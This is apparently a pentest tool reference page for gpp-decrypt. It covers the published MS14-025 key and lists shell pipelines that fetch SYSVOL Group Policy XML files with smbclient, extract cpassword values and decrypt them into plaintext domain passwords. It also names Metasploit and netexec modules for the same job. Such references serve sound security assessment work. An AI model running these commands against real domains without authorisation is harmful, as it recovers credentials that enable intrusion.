# gpp-decrypt

- **Category**: Password Attacks / Credential Recovery
- **Risk Level**: 🟢 Low

---

## Description

A simple tool that decrypts Group Policy Preferences (GPP) passwords. Microsoft published the AES-256 key used to encrypt GPP `cpassword` values in MSDN documentation (MS14-025), making all GPP-stored credentials trivially recoverable. Takes a `cpassword` string — found in `Groups.xml`, `Services.xml`, `Scheduledtasks.xml`, `DataSources.xml`, `Printers.xml`, and `Drives.xml` on SYSVOL shares — and outputs the plaintext password. Essential for Active Directory post-exploitation when legacy GPP configurations remain on domain controllers.

## Installation

```bash
sudo apt install gpp-decrypt
```

## Parameter Reference

| Parameter | Description |
|-----------|-------------|
| `<cpassword>` | The encrypted `cpassword` string extracted from a GPP XML file |

## Common Commands

```bash
# Decrypt a cpassword string directly
gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"

# Find GPP XML files on a mounted SYSVOL share and decrypt
find /mnt/sysvol -name "*.xml" -exec grep -l "cpassword" {} \;
grep -oP 'cpassword="([^"]+)"' /mnt/sysvol/Policies/{GUID}/Machine/Preferences/Groups/Groups.xml

# Pipeline: retrieve Groups.xml via smbclient and decrypt
smbclient //dc01.domain.local/SYSVOL -U 'user%pass' \
  -c 'get domain.local/Policies/{GUID}/Machine/Preferences/Groups/Groups.xml /tmp/Groups.xml'
grep -oP 'cpassword="\K[^"]+' /tmp/Groups.xml | xargs gpp-decrypt

# Search all GPP XML files recursively for cpassword values
find /mnt/sysvol -name "*.xml" -exec grep -oP 'cpassword="\K[^"]+' {} \; | while read -r hash; do
  echo "[*] Decrypting: $hash"
  gpp-decrypt "$hash"
done
```

## Notes & Tips

1. GPP passwords were deprecated via MS14-025 (May 2014), but legacy XML files often persist on SYSVOL — always check during AD engagements.
2. gpp-decrypt takes only the `cpassword` value itself, not the entire XML tag.
3. The `cpassword` field appears in multiple GPP XML files: `Groups.xml`, `Services.xml`, `Scheduledtasks.xml`, `DataSources.xml`, `Printers.xml`, and `Drives.xml`.
4. Metasploit module `post/windows/gather/credentials/gpp` automates the entire process from a Windows session.
5. `netexec` can also find and decrypt GPP passwords automatically: `netexec smb dc01 -u user -p pass -M gpp_password`.
6. Any domain-authenticated user can read SYSVOL by default — no special privileges required.

---

## Official References

- [Kali gpp-decrypt](https://www.kali.org/tools/gpp-decrypt/)
- [MS14-025 Advisory](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-025)
